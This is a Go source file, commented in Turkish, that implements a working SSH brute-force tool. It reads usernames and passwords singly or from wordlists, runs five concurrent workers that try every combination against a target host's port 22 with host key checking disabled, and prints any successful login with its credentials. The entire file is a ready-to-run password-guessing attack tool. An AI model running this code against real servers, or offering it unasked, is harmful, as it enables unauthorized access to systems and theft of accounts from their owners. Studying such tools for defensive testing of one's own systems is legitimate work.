package main

// (ç)alıntı alınan repolar:
// https://github.com/yourfavDev/go-brute/blob/main/main.go
// https://github.com/aldenso/sshgobrute/blob/master/main.go

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

// flag yapısı
type flags struct {
	passwords []string
	users     []string
	host      string
}

func main() {
	flags, err := parseFlags()
	if err != nil {
		fmt.Println("Hata:", err)
		os.Exit(1)
	}

	workerPool(flags)
}

func parseFlags() (flags, error) {
	var f flags
	args := os.Args[1:]

	// Flag'lerin kontrolü için boolean değişkenler
	var passwordFlag bool
	var userFlag bool
	var hostFlag bool

	// Argümanların tek tek kontrolü
	for i := 0; i < len(args); i++ {
		arg := args[i]

		if arg == "-p" {
			if i+1 < len(args) {
				f.passwords = append(f.passwords, args[i+1])
				passwordFlag = true
				i++ // Bir sonraki argümana geç
			} else {
				return f, fmt.Errorf("-p flag'i için bir şifre değeri gerekiyor")
			}
		} else if arg == "-P" {
			if i+1 < len(args) {
				passwords, err := readListFromFile(args[i+1])
				if err != nil {
					return f, fmt.Errorf("şifre listesi okuma hatası: %w", err)
				}
				f.passwords = append(f.passwords, passwords...)
				passwordFlag = true
				i++
			} else {
				return f, fmt.Errorf("-P flag'i için bir şifre listesi dosyası gerekiyor")
			}
		} else if arg == "-u" {
			if i+1 < len(args) {
				f.users = append(f.users, args[i+1])
				userFlag = true
				i++
			} else {
				return f, fmt.Errorf("-u flag'i için bir kullanıcı adı değeri gerekiyor")
			}
		} else if arg == "-U" {
			if i+1 < len(args) {
				users, err := readListFromFile(args[i+1])
				if err != nil {
					return f, fmt.Errorf("kullanıcı listesi okuma hatası: %w", err)
				}
				f.users = append(f.users, users...)
				userFlag = true
				i++
			} else {
				return f, fmt.Errorf("-U flag'i için bir kullanıcı listesi dosyası gerekiyor")
			}
		} else if arg == "-h" {
			if i+1 < len(args) {
				f.host = args[i+1]
				hostFlag = true
				i++
			} else {
				return f, fmt.Errorf("-h flag'i için bir host değeri gerekiyor")
			}
		} else {
			return f, fmt.Errorf("bilinmeyen flag: %s", arg)
		}
	}
	// Zorunlu flag'leri kontrol et
	if !passwordFlag {
		return f, fmt.Errorf("şifre flag'i (-p veya -P) gerekiyor")
	}
	if !userFlag {
		return f, fmt.Errorf("kullanıcı flag'i (-u veya -U) gerekiyor")
	}
	if !hostFlag {
		return f, fmt.Errorf("host flag'i (-h) gerekiyor")
	}
	return f, nil
}

func readListFromFile(filePath string) ([]string, error) {
	// Dosya okunur
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	// Satırlar okunarak listeye eklenir
	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, strings.TrimSpace(scanner.Text()))
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return lines, nil
}

func trySSHConnection(host, user, password string) bool {
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		// Host Key uyarısını görmezden gelir
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}

	conn, err := ssh.Dial("tcp", host+":22", config)
	if err == nil {
		conn.Close()
		return true
	}
	return false
}

func worker(id int, jobs <-chan []string, results chan<- string) {
	for j := range jobs {
		if trySSHConnection(j[0], j[1], j[2]) {
			results <- fmt.Sprintf("\n\nworker %d; Başarılı giriş! Kullanıcı Adı: %s Şifre: %s \n\n\n", id, j[1], j[2])
		} else {
			results <- fmt.Sprintf("worker %d; Yanlış kullanıcı adı veya şifre! Kullanıcı Adı: %s Şifre: %s \n", id, j[1], j[2])
		}
	}
}

func workerPool(f flags) {
	numJobs := len(f.users) * len(f.passwords)
	jobs := make(chan []string, numJobs)
	results := make(chan string, numJobs)

	// Sabit 5 worker ile çalışıyoruz, buradaki mantık direk dökümantasyona çok yakın, kaynak:
	// https://gobyexample.com/worker-pools
	fmt.Println("Başlatılıyor...\nYapılacak toplam deneme sayısı:", numJobs, " \n İşçi sayısı: 5")

	for w := 1; w <= 5; w++ {
		go worker(w, jobs, results)
	}

	for _, user := range f.users {
		for _, pass := range f.passwords {
			jobs <- []string{f.host, user, pass}
		}
	}

	close(jobs) // Kanalı kapat, artık iş yok

	// Sonuçları yazdır
	for a := 1; a <= numJobs; a++ {
		fmt.Print(<-results)
	}
}
